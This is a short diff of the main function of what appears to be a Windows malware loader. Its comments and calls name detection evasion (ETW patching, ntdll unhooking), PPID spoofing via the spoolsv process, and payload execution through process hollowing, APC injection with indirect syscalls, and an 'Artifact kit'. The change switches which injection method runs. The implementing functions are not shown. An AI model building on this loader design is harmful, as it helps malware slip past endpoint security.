@@ -16,12 +16,10 @@ int main()
 
 
     // Patching the Event Tracing for Windows (ETW) to prevent detection
-    evt_patch();
+    // evt_patch();
 
     // Create a fresh copy of the ntdll library from file to unhook functions
     // unhooking();
-
-
 
     // Get spoolsv PID for PPID spoofing
     DWORD pid = GetPID();
@@ -37,15 +35,14 @@ int main()
     // For synchronous payload execution with PPID spoofing through process hollowing
     //Indirect_RawExec_ppid(pid);
 
-
-
-
     // For APC execution with indirect syscalls
     // IndirectAPC();
 
-
     // For APC execution in a remote process with indirect syscalls
-    IndirectRemoteAPC(pid);
+    // IndirectRemoteAPC(pid);
+
+    // For Artifact kit execution with PPID spoofing through process hollowing
+    execArtifact(pid);
 
 
 
